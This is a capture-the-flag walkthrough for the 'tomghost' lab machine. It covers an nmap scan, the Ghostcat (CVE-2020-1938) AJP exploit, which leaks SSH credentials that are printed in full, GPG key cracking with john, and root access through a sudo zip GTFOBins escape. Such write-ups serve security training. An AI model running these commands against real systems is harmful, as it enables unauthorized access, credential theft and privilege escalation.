# tomghost

## 1. nmap scan
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## 2. Tags...
In the Tags of this CTF machine we can find "CVE-2020-1938"
So lets exploit this CVE. (exploit from https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md)
- python2 exploit.py 10.10.55.77
--> we can find some creds: skyfuck:8730281lkjlkjdqlksalks

## 3. lets try ssh... privesc
We got access
In the user folder from skyfuck are 2 files, we can download ist with:
- scp skyfuck@10.10.73.205:/home/skyfuck/* .
- gpg2john tryhackme.asc > hash
- john -wordlist=/usr/share/wordlist/rockyou.txt
We got an Password
- gpg --import tryhackme.asc
- gpg --decrypt credetials.pgp
We got Merlins Password
- su merlin
- sudo -l
We see "/usr/bin/zip".. we have to use use it.
After a search on https://gtfobins.github.io/gtfobins/zip/#sudo
- TF=$(mktemp -u)
- sudo zip $TF /etc/hosts -T -TT 'sh #'

We are root :)
